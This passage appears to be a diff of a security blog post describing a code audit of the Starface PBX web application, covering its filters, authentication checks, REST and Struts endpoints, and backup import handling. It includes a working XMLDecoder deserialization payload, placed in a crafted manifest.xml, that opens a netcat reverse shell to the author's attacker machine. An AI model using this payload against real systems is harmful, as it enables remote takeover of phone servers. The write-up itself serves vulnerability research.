+	<span class="nt">&lt;filter-mapping&gt;</span>
+		<span class="nt">&lt;filter-name&gt;</span>PortFilter<span class="nt">&lt;/filter-name&gt;</span>
+		<span class="nt">&lt;servlet-name&gt;</span>REST<span class="nt">&lt;/servlet-name&gt;</span>
+	<span class="nt">&lt;/filter-mapping&gt;</span>
+	<span class="nt">&lt;filter-mapping&gt;</span>
+		<span class="nt">&lt;filter-name&gt;</span>AntiXssFilter<span class="nt">&lt;/filter-name&gt;</span>
+		<span class="nt">&lt;servlet-name&gt;</span>REST<span class="nt">&lt;/servlet-name&gt;</span>
+	<span class="nt">&lt;/filter-mapping&gt;</span>
+</code></pre></div></div>
+
+<p>We also noted the first time some kind of “security awareness” from the programmer’s perspective by spotting the keyword <code class="language-plaintext highlighter-rouge">AntiXssFilter</code>.</p>
+
+<p>There were a few more combinations but I won’t list all of them.
+If you’re familiar with manual <code class="language-plaintext highlighter-rouge">web.xml</code> parsing and might already think about <strong>Pre-Auth endpoints</strong> then try to find declarations with <code class="language-plaintext highlighter-rouge">&lt;security-constraint&gt;</code>: you won’t for Starface! It seemed that they used some kind of custom <code class="language-plaintext highlighter-rouge">AuthFilter</code> instead. Such kind of Java Filter was applied at all kinds of URL patterns e.g. for all <code class="language-plaintext highlighter-rouge">.do</code> URLs.</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[...]
+	<span class="nt">&lt;filter&gt;</span>
+		<span class="nt">&lt;filter-name&gt;</span>AuthFilter<span class="nt">&lt;/filter-name&gt;</span>
+		<span class="nt">&lt;filter-class&gt;</span>de.vertico.starface.filters.AuthFilter<span class="nt">&lt;/filter-class&gt;</span>
+	<span class="nt">&lt;/filter&gt;</span>
+[...]
+	<span class="nt">&lt;filter-mapping&gt;</span>
+		<span class="nt">&lt;filter-name&gt;</span>AuthFilter<span class="nt">&lt;/filter-name&gt;</span>
+		<span class="nt">&lt;url-pattern&gt;</span>*.do<span class="nt">&lt;/url-pattern&gt;</span>
+	<span class="nt">&lt;/filter-mapping&gt;</span>
+[...]
+</code></pre></div></div>
+
+<p>Alright, let’s recap: most of the <code class="language-plaintext highlighter-rouge">web.xml</code> contained Java Filter declarations. This was fine since Java Filters are implemented in Java code as Java Servlets are as well. From a programmatic perspective, they only differ (that’s a <em>very rough differentiator!</em>) in the method name being called during request processing.</p>
+
+<ul>
+  <li>Java Filters: <code class="language-plaintext highlighter-rouge">doFilter</code></li>
+  <li>Java Servlets: <code class="language-plaintext highlighter-rouge">doGet, doPost, service</code></li>
+</ul>
+
+<p>As I understood it, Java Filter order in the descriptor file is usually preserved for the request processing part. What does this mean? Let’s make an example.</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[...]
+	<span class="nt">&lt;filter-mapping&gt;</span>
+		<span class="nt">&lt;filter-name&gt;</span>CharacterEncodingFilter<span class="nt">&lt;/filter-name&gt;</span>
+		<span class="nt">&lt;url-pattern&gt;</span>/*<span class="nt">&lt;/url-pattern&gt;</span>
+	<span class="nt">&lt;/filter-mapping&gt;</span>
+	<span class="nt">&lt;filter-mapping&gt;</span>
+		<span class="nt">&lt;filter-name&gt;</span>FailedRequestFilter<span class="nt">&lt;/filter-name&gt;</span>
+		<span class="nt">&lt;url-pattern&gt;</span>/*<span class="nt">&lt;/url-pattern&gt;</span>
+	<span class="nt">&lt;/filter-mapping&gt;</span>
+[...]
+</code></pre></div></div>
+
+<p>These two filters should be triggered by basically every incoming request. If I’m unable to Google specific questions, I simply test it empirically. Since we had the debugging environment running already, a test was easy.</p>
+
+<ol>
+  <li>Set a breakpoint at <code class="language-plaintext highlighter-rouge">de.vertico.starface.filters.CharacterEncodingFilter.doFilter(ServletRequest, ServletResponse, FilterChain)</code>.</li>
+  <li>Set a breakpoint at <code class="language-plaintext highlighter-rouge">de.vertico.starface.filters.FailedRequestFilter.doFilter(ServletRequest, ServletResponse, FilterChain)</code>.</li>
+  <li>Browse to <code class="language-plaintext highlighter-rouge">http://192.168.2.103/IDefinitelyDontCare</code>.</li>
+</ol>
+
+<p><img src="/assets/images/auditfails/characterencodingfilter.png" alt="Character Encoding Filter" /></p>
+
+<p><img src="/assets/images/auditfails/failedrequestfilter.png" alt="Failed Request Filter" /></p>
+
+<p>It seemed this was a correct assumption. Why did we care? Because if a Java Filter contained a vulnerability before any <em>authentication check</em> could step in (remember the <code class="language-plaintext highlighter-rouge">AuthFilter</code>?), this would have led to a <em>Pre-Auth condition</em>. So we could have built a graph of URL patterns and Java Filter orders to obtain a list of Java Filters called before authentication checks would have been triggered.</p>
+
+<p>Additionally, we spotted a file inclusion of <code class="language-plaintext highlighter-rouge">WEB-INF/xml/authfilter_config.xml</code> in the <code class="language-plaintext highlighter-rouge">web.xml</code> with the following content.</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;properties&gt;</span>
+	<span class="nt">&lt;category</span> <span class="na">name=</span><span class="s">"general"</span><span class="nt">&gt;</span>
+	<span class="c">&lt;!-- 
+		Hier werden Pfade aufgelistet die keine Authorisierung brauchen
+		und vom AuthFilter ignoriert werden
+		(translated by me)
+		This is a list of paths which do not need any authorization and
+		are therefore ignored bei AuthFilter
+		(/translated by me)
+	 --&gt;</span>
+		<span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"/ajax/restore"</span> <span class="na">value=</span><span class="s">"true"</span> <span class="nt">/&gt;</span>
+		<span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"/ajax/update"</span> <span class="na">value=</span><span class="s">"true"</span> <span class="nt">/&gt;</span>
+		<span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"/blank.html"</span> <span class="na">value=</span><span class="s">"true"</span> <span class="nt">/&gt;</span>
+		<span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"/index.jsp"</span> <span class="na">value=</span><span class="s">"true"</span> <span class="nt">/&gt;</span>
+		<span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"/jsp/blank.html"</span> <span class="na">value=</span><span class="s">"true"</span> <span class="nt">/&gt;</span>
+		<span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"/login.jsp"</span> <span class="na">value=</span><span class="s">"true"</span> <span class="nt">/&gt;</span>
+	<span class="nt">&lt;/category&gt;</span>
+<span class="nt">&lt;/properties&gt;</span>
+</code></pre></div></div>
+
+<p>These were additional candidates to check for Pre-Auth flaws.</p>
+
+<p>What about endpoints which were not handled by this <code class="language-plaintext highlighter-rouge">AuthFilter</code>? We found another authentication check filter in <code class="language-plaintext highlighter-rouge">web.xml</code></p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>		<span class="nt">&lt;filter-name&gt;</span>RestAuthFilterA<span class="nt">&lt;/filter-name&gt;</span>
+		<span class="nt">&lt;filter-class&gt;</span>de.starface.rest.authentication.RestAuthFilter<span class="nt">&lt;/filter-class&gt;</span>
+</code></pre></div></div>
+
+<p>which might be handling URLs of another <strong>REST</strong> interface.</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="nt">&lt;servlet-mapping&gt;</span>
+		<span class="nt">&lt;servlet-name&gt;</span>REST<span class="nt">&lt;/servlet-name&gt;</span>
+		<span class="nt">&lt;url-pattern&gt;</span>/rest/*<span class="nt">&lt;/url-pattern&gt;</span>
+	<span class="nt">&lt;/servlet-mapping&gt;</span>
+</code></pre></div></div>
+
+<p>Finding another Filter/Servlet mapping confirmed our assumption.</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="nt">&lt;filter-mapping&gt;</span>
+		<span class="nt">&lt;filter-name&gt;</span>RestAuthFilterA<span class="nt">&lt;/filter-name&gt;</span>
+		<span class="nt">&lt;servlet-name&gt;</span>REST<span class="nt">&lt;/servlet-name&gt;</span>
+	<span class="nt">&lt;/filter-mapping&gt;</span>
+</code></pre></div></div>
+
+<p>The Java Servlet definition was found quickly.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	&lt;servlet&gt;
+		&lt;servlet-name&gt;REST&lt;/servlet-name&gt;
+		&lt;servlet-class&gt;com.sun.jersey.spi.spring.container.servlet.SpringServlet&lt;/servlet-class&gt;
+		&lt;init-param&gt;
+			&lt;param-name&gt;com.sun.jersey.config.property.packages&lt;/param-name&gt;
+			&lt;param-value&gt;
+				io.swagger.jaxrs.json;
+				io.swagger.jaxrs.listing;
+				de.starface.middleware;
+				de.starface.persistence.jpa;
+				de.starface.rest;
+				de.starface.rest.common;
+				de.starface.rest.controller;
+				de.starface.rest.addressbook.api;
+				de.starface.rest.redirects.api;
+				de.starface.rest.fmcPhones.api
+				de.starface.rest.functionkeys.api;
+				de.starface.rest.users.api;
+		[...]
+</code></pre></div></div>
+
+<p>So we should take a look at the namespace <code class="language-plaintext highlighter-rouge">de.starface.rest</code> to get an idea of how the <strong>Spring REST</strong> interfaces were implemented. The <strong>namespace structure</strong> often gives good hints about how the programmers organized their code: another important step to make your code auditing process more efficient.</p>
+
+<p><img src="/assets/images/auditfails/restnamespacestructure.png" alt="REST Namespace Structure" /></p>
+
+<p>Let’s have a look how the request handling was done for the Spring interfaces in e.g. <code class="language-plaintext highlighter-rouge">de.starface.rest.controller.AccountsApi</code>.</p>
+
+<p><img src="/assets/images/auditfails/restgetaccountslist.png" alt="REST Accounts List" /></p>
+
+<p>What makes this kind of request handling easily readable (and discoverable!) were <strong>Annotations</strong> like <code class="language-plaintext highlighter-rouge">@Path, @Consumes, @Produces, ...</code>, distinguishable from the Java Servlet request handlers we described above. This is why learning about the frameworks being used is important to not miss any request handlers right at the beginning.</p>
+
+<p>To verify my current state of knowledge, I always tend to make checks from time to time in the debugger. Let’s stick to the <code class="language-plaintext highlighter-rouge">de.starface.rest.controller.AccountsApi</code> use-case. We did a GET request to the following URL <code class="language-plaintext highlighter-rouge">http://192.168.2.103/rest/accounts/</code> from an <em>unauthenticated</em> context and…hit the breakpoint.</p>
+
+<p><img src="/assets/images/auditfails/restbreakpointhit.png" alt="REST Breakpoint Hit" /></p>
+
+<p>That was somehow unexpected because I rather expected that my request would be sorted out by the <code class="language-plaintext highlighter-rouge">RestAuthFilterA</code> in advance. My assumption failed but that was fine because I could hit endpoints without prior authentication obviously. What did I see in BurpSuite then?</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 401 
+[...]
+
+{"code":"d937bb0c-ab0f-464a-a02a-41840746a45a","message":"Not logged in"}
+</code></pre></div></div>
+
+<p>But why? The implementing class could be found in <code class="language-plaintext highlighter-rouge">de.starface.rest.accounts.api.impl.AccountsApiServiceImpl.getAccounts(HttpServletRequest)</code>:</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*    */</span>   <span class="kd">public</span> <span class="nc">Response</span> <span class="nf">getAccounts</span><span class="o">(</span><span class="nc">HttpServletRequest</span> <span class="n">request</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">RestException</span> <span class="o">{</span>
+<span class="cm">/* 30 */</span>     <span class="nc">AuthHelper</span><span class="o">.</span><span class="na">getAndCheckPrincipal</span><span class="o">(</span><span class="n">request</span><span class="o">);</span>
+<span class="cm">/* 31 */</span>     <span class="nc">CATConnectorPGSQL</span> <span class="n">catConnectorPgsql</span> <span class="o">=</span> <span class="o">(</span><span class="nc">CATConnectorPGSQL</span><span class="o">)</span><span class="nc">StarfaceComponentProvider</span><span class="o">.</span><span class="na">getInstance</span><span class="o">().</span><span class="na">fetch</span><span class="o">(</span><span class="nc">CATConnectorPGSQL</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+<span class="cm">/*    */</span>     
+<span class="cm">/* 33 */</span>     <span class="k">return</span> <span class="nc">RestResponse</span><span class="o">.</span><span class="na">returnSuccessfulWithData</span><span class="o">(</span><span class="nc">AccountsFactory</span><span class="o">.</span><span class="na">createAccounts</span><span class="o">(</span><span class="n">catConnectorPgsql</span>
+<span class="cm">/* 34 */</span>           <span class="o">.</span><span class="na">getAccount2ParamsMapIdAndName</span><span class="o">(),</span> <span class="k">new</span> <span class="nc">HashSet</span><span class="o">()));</span>
+<span class="cm">/*    */</span>   <span class="o">}</span>
+</code></pre></div></div>
+
+<p>And we found another authentication check variant with <code class="language-plaintext highlighter-rouge">AuthHelper.getAndCheckPrincipal(request)</code>. And here it is.</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*    */</span>   <span class="kd">public</span> <span class="kd">static</span> <span class="nc">Principal</span> <span class="nf">getAndCheckPrincipal</span><span class="o">(</span><span class="nc">HttpServletRequest</span> <span class="n">request</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">RestException</span> <span class="o">{</span>
+<span class="cm">/*    */</span>     <span class="nc">Principal</span> <span class="n">principal</span><span class="o">;</span>
+<span class="cm">/* 27 */</span>     <span class="nc">Object</span> <span class="n">principalAttribute</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getAttribute</span><span class="o">(</span><span class="s">"principal"</span><span class="o">);</span>
+<span class="cm">/*    */</span>     
+<span class="cm">/* 29 */</span>     <span class="k">if</span> <span class="o">(</span><span class="n">principalAttribute</span> <span class="k">instanceof</span> <span class="nc">Principal</span><span class="o">)</span> <span class="o">{</span>
+<span class="cm">/* 30 */</span>       <span class="n">principal</span> <span class="o">=</span> <span class="o">(</span><span class="nc">Principal</span><span class="o">)</span><span class="n">principalAttribute</span><span class="o">;</span>
+<span class="cm">/*    */</span>     <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+<span class="cm">/* 32 */</span>       <span class="k">throw</span> <span class="k">new</span> <span class="nc">BadRequestException</span><span class="o">(</span><span class="s">"46dca6f5-ed1a-44c9-920d-b0e57ea17ef5"</span><span class="o">,</span> <span class="s">"Invalid Rest-Request: Missing Authentication"</span><span class="o">);</span>
+<span class="cm">/*    */</span>     <span class="o">}</span> 
+<span class="cm">/*    */</span>     
+<span class="cm">/* 35 */</span>     <span class="k">if</span> <span class="o">(</span><span class="n">principal</span><span class="o">.</span><span class="na">isGuest</span><span class="o">())</span> <span class="o">{</span>
+<span class="cm">/* 36 */</span>       <span class="k">throw</span> <span class="k">new</span> <span class="nc">UnauthorizedException</span><span class="o">(</span><span class="s">"d937bb0c-ab0f-464a-a02a-41840746a45a"</span><span class="o">,</span> <span class="s">"Not logged in"</span><span class="o">);</span>
+</code></pre></div></div>
+
+<p>One could easily recognize that the <code class="language-plaintext highlighter-rouge">UnauthorizedException</code> was an exact match with our HTTP response from the server. So it seemed obvious to check <strong>all controller classes</strong> in this namespace for</p>
+
+<ol>
+  <li>the existence of the <code class="language-plaintext highlighter-rouge">AuthHelper.getAndCheckPrincipal(request)</code> call</li>
+  <li>if the call was there, if some processing on the attacker-controlled <code class="language-plaintext highlighter-rouge">HttpServletRequest</code> was done before</li>
+</ol>
+
+<p><em>Step 2</em> was another lessons learned because the existence of an authentication check does <strong>not</strong> mean that maybe one couldn’t do something bad before this check would have been called. Unfortunately, after looking at <em>all controller classes</em> I did not spot any obvious flaws.</p>
+
+<p>Did we have a good understanding about all request source handling already? No, only <code class="language-plaintext highlighter-rouge">web.xml</code> based Java Servlet and Filter request handling and Spring framework annotated ones so far.</p>
+
+<h1 id="struts-configxml">struts-config.xml</h1>
+
+<p>In the <code class="language-plaintext highlighter-rouge">web.xml</code> some URL pattern definitions for <code class="language-plaintext highlighter-rouge">.action</code> and <code class="language-plaintext highlighter-rouge">.do</code> brought us to the conclusion that <strong>Struts</strong> might be in use. We should have a look at <code class="language-plaintext highlighter-rouge">struts.xml</code> and <code class="language-plaintext highlighter-rouge">struts-config.xml</code> for this which I did.</p>
+
+<p>Another framework, another configuration scheme, other things to look at and understand. That’s the exhausting part of code audits and this is also why audits might last several days, weeks or even months before one at least understands all the “inner workings” of a product.</p>
+
+<p>Let’s take an example from the <code class="language-plaintext highlighter-rouge">struts-config.xml</code> file.</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[...]
+        <span class="nt">&lt;action</span> <span class="na">path=</span><span class="s">"/config/backup/importBackup"</span>
+            <span class="na">type=</span><span class="s">"de.vertico.starface.config.server.actions.BackupImportAction"</span>
+            <span class="na">name=</span><span class="s">"importBackupForm"</span> <span class="na">validate=</span><span class="s">"false"</span>
+            <span class="na">parameter=</span><span class="s">"requiredPermission=administration;task=execute"</span><span class="nt">&gt;</span>
+            <span class="nt">&lt;forward</span> <span class="na">name=</span><span class="s">"nextStep"</span> <span class="na">path=</span><span class="s">"/jsp/progress/backup-import.jsp"</span><span class="nt">/&gt;</span>
+        <span class="nt">&lt;/action&gt;</span>
+[...]
+</code></pre></div></div>
+
+<p>There was a <em>path</em>, <em>type</em> (our code!), and also some <em>parameters</em> which pointed to required permissions needed. You should enumerate again all <em>action paths</em> and understand the difference between permission types etc.
+We’ll stick to this specific path for a moment. Could I find the request trigger in the UI as well? I always jump between my debugging window, my decompiled source in VS code and my desktop with BurpSuite and browser open.</p>
+
+<p>Since the permission requirement said <em>administration</em>, I logged in as administrator <code class="language-plaintext highlighter-rouge">0001</code>. After a bit of clicking around, I found the menu entry <strong>Configuration</strong>.</p>
+
+<p><img src="/assets/images/auditfails/administrationUI.png" alt="Administration UI" /></p>
+
+<p>The endpoint definition said <code class="language-plaintext highlighter-rouge">importBackup</code> which seemed to be a good match here.</p>
+
+<p><img src="/assets/images/auditfails/backupUI.png" alt="Administration UI" /></p>
+
+<p>We triggered a <em>Default Backup</em> to verify the suspected chain in the code (and also create a backup artifact). A POST request to <code class="language-plaintext highlighter-rouge">http://192.168.2.103/config/server/backup/execute.do</code> was observed. The backup was downloadable and named <code class="language-plaintext highlighter-rouge">backup-Default-1653253925922.sar</code>. What did the file content look like?</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user:~/Downloads<span class="nv">$ </span>unzip <span class="nt">-l</span> backup-Default-1653253925922.sar
+Archive:  backup-Default-1653253925922.sar
+  Length      Date    Time    Name
+<span class="nt">---------</span>  <span class="nt">----------</span> <span class="nt">-----</span>   <span class="nt">----</span>
+    12542  2022-05-22 23:12   db-entities/de.vertico.starface.db.v191.hibernate.CountryCode
+<span class="o">[</span>...]
+     5167  2022-05-22 23:12   var-data/srtpcerts/asterisk.pem
+     1465  2022-05-22 23:12   var-data/phonecerts/cert_rootca.der.new
+     1358  2022-05-22 23:12   var-data/phonecerts/pubkey_cert.DER.new
+     1465  2022-05-22 23:12   var-data/phonecerts/cert_rootca.der
+     1358  2022-05-22 23:12   var-data/phonecerts/pubkey_cert.DER
+  3821434  2022-05-22 23:12   music-on-hold2/starface-music.sln16
+     3743  2022-05-22 23:12   db-entities/de.vertico.starface.db.SequenceValue
+    17638  2022-05-22 23:12   manifest.xml
+<span class="nt">---------</span>                     <span class="nt">-------</span>
+  8270904                     417 files
+</code></pre></div></div>
+
+<p><em>Backup restore functions</em> usually are excellently suited for getting <strong>fast RCE</strong>. We needed a success story after this unsuccessful trip for days. Also this could have been one part of a more interesting exploitation chain. Who knows?</p>
+
+<p>Time to look at the class <code class="language-plaintext highlighter-rouge">de.vertico.starface.config.server.actions.BackupImportAction</code> and since this was based on Struts: <code class="language-plaintext highlighter-rouge">de.vertico.starface.config.server.actions.BackupImportAction.execute(ActionMapping, ActionForm)</code>.</p>
+
+<p>First, the <code class="language-plaintext highlighter-rouge">org.apache.struts.action.ActionForm form</code> from the request was casted into a new variable <code class="language-plaintext highlighter-rouge">de.vertico.starface.config.server.forms.BackupImportForm importForm</code> which eventually landed here in the same <code class="language-plaintext highlighter-rouge">execute</code> method.</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[...]</span>
+<span class="cm">/*  67 */</span>       <span class="k">if</span> <span class="o">(</span><span class="n">importForm</span><span class="o">.</span><span class="na">isImportUpload</span><span class="o">())</span>
+<span class="cm">/*     */</span>       <span class="o">{</span>
+<span class="cm">/*  69 */</span>         <span class="k">return</span> <span class="n">prepareUploadFileTask</span><span class="o">(</span><span class="n">mapping</span><span class="o">,</span> <span class="n">importForm</span><span class="o">);</span>
+<span class="cm">/*     */</span>       <span class="o">}</span>
+<span class="o">[...]</span>
+</code></pre></div></div>
+
+<p>The next call went to <code class="language-plaintext highlighter-rouge">de.vertico.starface.config.server.actions.BackupImportAction.prepareUploadFileTask(ActionMapping, BackupImportForm)</code>. The <code class="language-plaintext highlighter-rouge">importForm</code> was then casted there into again a new variable <code class="language-plaintext highlighter-rouge">org.apache.struts.upload.FormFile importFile</code>. The upload content was then written into a <code class="language-plaintext highlighter-rouge">FileOutputStream out</code> with help of <code class="language-plaintext highlighter-rouge">org.apache.commons.io.IOUtils.copy(InputStream, OutputStream)</code>. A “temporary file” was created then and processing the uploaded content began with a call to</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[...]</span>
+<span class="cm">/* 204 */</span>       <span class="nc">IManifestContainer</span> <span class="n">container</span> <span class="o">=</span> <span class="nc">ContainerResolver</span><span class="o">.</span><span class="na">getContainer</span><span class="o">(</span><span class="n">tmpFile</span><span class="o">);</span>
+<span class="o">[...]</span>
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">getContainer</code> method simply returned the result of another method call <code class="language-plaintext highlighter-rouge">return new ZipManifestContainer(file)</code>.</p>
+
+<p>The constructor of <code class="language-plaintext highlighter-rouge">de.vertico.starface.db.container.ZipManifestContainer.ZipManifestContainer(File)</code> finally contained a call to a <code class="language-plaintext highlighter-rouge">readManifest()</code> method.</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*    */</span>   <span class="kd">private</span> <span class="kt">void</span> <span class="nf">readManifest</span><span class="o">()</span> <span class="kd">throws</span> <span class="nc">IOException</span> <span class="o">{</span>
+<span class="cm">/* 33 */</span>     <span class="k">try</span> <span class="o">(</span><span class="nc">ZipFile</span> <span class="n">zip</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ZipFile</span><span class="o">(</span><span class="n">getFile</span><span class="o">()))</span> <span class="o">{</span>
+<span class="cm">/* 34 */</span>       <span class="n">entry</span> <span class="o">=</span> <span class="n">zip</span><span class="o">.</span><span class="na">getEntry</span><span class="o">(</span><span class="s">"manifest.xml"</span><span class="o">);</span>
+<span class="cm">/* 35 */</span>       <span class="k">if</span> <span class="o">(</span><span class="n">entry</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+<span class="cm">/* 36 */</span>         <span class="k">throw</span> <span class="k">new</span> <span class="nc">IOException</span><span class="o">(</span><span class="s">"No manifest entry found"</span><span class="o">);</span>
+<span class="cm">/*    */</span>       <span class="o">}</span>
+<span class="cm">/* 38 */</span>       <span class="nc">InputStream</span> <span class="n">in</span> <span class="o">=</span> <span class="n">zip</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">(</span><span class="n">entry</span><span class="o">);</span>
+<span class="cm">/* 39 */</span>       <span class="nc">XMLDecoder</span> <span class="n">dec</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLDecoder</span><span class="o">(</span><span class="n">in</span><span class="o">);</span>
+<span class="cm">/* 40 */</span>       <span class="k">this</span><span class="o">.</span><span class="na">manifest</span> <span class="o">=</span> <span class="o">(</span><span class="nc">Manifest</span><span class="o">)</span><span class="n">dec</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span> <span class="c1">// &lt;--- Ouch!!</span>
+<span class="cm">/* 41 */</span>       <span class="n">dec</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+<span class="cm">/* 42 */</span>       <span class="n">in</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+<span class="cm">/*    */</span>     <span class="o">}</span> 
+<span class="cm">/*    */</span>   <span class="o">}</span>
+</code></pre></div></div>
+
+<p>And here we had found it: our <strong>fast RCE</strong>. <code class="language-plaintext highlighter-rouge">XmlDecoder.readObject</code> is a well-known “friend” for Java code auditors because it allows instant code execution without any restrictions to class paths or so as it is known for other unmarshalling/deserialization flaws.</p>
+
+<p>Since <code class="language-plaintext highlighter-rouge">netcat</code> with <code class="language-plaintext highlighter-rouge">-e</code> option came preinstalled on the vendor’s virtual machine, this was a quick win.</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+<span class="nt">&lt;java</span> <span class="na">version=</span><span class="s">"1.8.0_292"</span> <span class="na">class=</span><span class="s">"java.beans.XMLDecoder"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;object</span> <span class="na">class=</span><span class="s">"java.lang.Runtime"</span> <span class="na">method=</span><span class="s">"getRuntime"</span><span class="nt">&gt;</span>
+      <span class="nt">&lt;void</span> <span class="na">method=</span><span class="s">"exec"</span><span class="nt">&gt;</span>
+      <span class="nt">&lt;array</span> <span class="na">class=</span><span class="s">"java.lang.String"</span> <span class="na">length=</span><span class="s">"5"</span><span class="nt">&gt;</span>
+          <span class="nt">&lt;void</span> <span class="na">index=</span><span class="s">"0"</span><span class="nt">&gt;</span>
+              <span class="nt">&lt;string&gt;</span>/usr/bin/nc<span class="nt">&lt;/string&gt;</span>
+          <span class="nt">&lt;/void&gt;</span>
+          <span class="nt">&lt;void</span> <span class="na">index=</span><span class="s">"1"</span><span class="nt">&gt;</span>
+              <span class="nt">&lt;string&gt;</span>-e<span class="nt">&lt;/string&gt;</span>
+          <span class="nt">&lt;/void&gt;</span>
+          <span class="nt">&lt;void</span> <span class="na">index=</span><span class="s">"2"</span><span class="nt">&gt;</span>
+              <span class="nt">&lt;string&gt;</span>/bin/sh<span class="nt">&lt;/string&gt;</span>
+          <span class="nt">&lt;/void&gt;</span>
+          <span class="nt">&lt;void</span> <span class="na">index=</span><span class="s">"3"</span><span class="nt">&gt;</span>
+              <span class="nt">&lt;string&gt;</span>192.168.2.100<span class="nt">&lt;/string&gt;</span> <span class="c">&lt;!-- my attacker machine --&gt;</span>
+          <span class="nt">&lt;/void&gt;</span>
+          <span class="nt">&lt;void</span> <span class="na">index=</span><span class="s">"4"</span><span class="nt">&gt;</span>
+              <span class="nt">&lt;string&gt;</span>1337<span class="nt">&lt;/string&gt;</span>
+          <span class="nt">&lt;/void&gt;</span>
+      <span class="nt">&lt;/array&gt;</span>
+      <span class="nt">&lt;/void&gt;</span>
+ <span class="nt">&lt;/object&gt;</span>
+<span class="nt">&lt;/java&gt;</span>
+</code></pre></div></div>
+
+<p>Honestly, when I was first browsing through the code to check for how the ZIP file content was processed, I rather thought about an XML External Entity (XXE) flaw but this was even better and a lot easier. Building a fake backup ZIP file with the malicious <code class="language-plaintext highlighter-rouge">manifest.xml</code> was quickly done and handed over to the restore function to prove the RCE.</p>
+
+<h1 id="unprivileged-user-attack-surface">Unprivileged User Attack Surface</h1>
+
+<p>Until then, we failed in looking for <strong>unauthenticated endpoints</strong> being vulnerable for anything relevant. <em>Remark: I did explain above that one should map all the URL patterns against Java Servlets and Filters described in <code class="language-plaintext highlighter-rouge">web.xml</code> which to this date, I did not. There might be some unseen attack surface!</em></p>
+
+<p>But since this blog post is not about the latest and coolest new RCEs but rather giving a walk-through over my whole security audit process, we proceed with the next category: <em>Searching for vulnerable actions as unprivileged user</em>.</p>
+
+<p>We begin with a biased trigger of my simple mind by the abbreviation <strong>RPC</strong> (Remote Procedure Call). This usually reminds me of a lot of vulnerabilities in the past. The <code class="language-plaintext highlighter-rouge">web.xml</code> indeed revealed something similar.</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[...]
+	<span class="nt">&lt;servlet-mapping&gt;</span>
+		<span class="nt">&lt;servlet-name&gt;</span>XmlRpcServlet<span class="nt">&lt;/servlet-name&gt;</span>
+		<span class="nt">&lt;url-pattern&gt;</span>/xml-rpc<span class="nt">&lt;/url-pattern&gt;</span>
+	<span class="nt">&lt;/servlet-mapping&gt;</span>
+</code></pre></div></div>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[...]
+	<span class="nt">&lt;servlet&gt;</span>
+		<span class="nt">&lt;servlet-name&gt;</span>XmlRpcServlet<span class="nt">&lt;/servlet-name&gt;</span>
+		<span class="nt">&lt;servlet-class&gt;</span>de.starface.com.rpc.xmlrpc.http.XmlRpcServlet<span class="nt">&lt;/servlet-class&gt;</span>
+		<span class="nt">&lt;init-param&gt;</span>
+			<span class="nt">&lt;param-name&gt;</span>authConverterFactory<span class="nt">&lt;/param-name&gt;</span>
+			<span class="nt">&lt;param-value&gt;</span>de.starface.integration.uci.ucp.connectors.UrlAccountAuthTokenConverterFactory<span class="nt">&lt;/param-value&gt;</span>
+		<span class="nt">&lt;/init-param&gt;</span>
+		<span class="nt">&lt;init-param&gt;</span>
+			<span class="nt">&lt;param-name&gt;</span>useAuthenticationReporter<span class="nt">&lt;/param-name&gt;</span>
+			<span class="nt">&lt;param-value&gt;</span>true<span class="nt">&lt;/param-value&gt;</span>
+		<span class="nt">&lt;/init-param&gt;</span>
+	<span class="nt">&lt;/servlet&gt;</span>
+[...]
+</code></pre></div></div>
+
+<p>So I had a look at <code class="language-plaintext highlighter-rouge">de.starface.com.rpc.xmlrpc.http.XmlRpcServlet.doPost(HttpServletRequest, HttpServletResponse)</code> first. Obviously, the next code snippet showed, something received and <strong>parsed</strong> XML-based data from an HTTP request.</p>
+
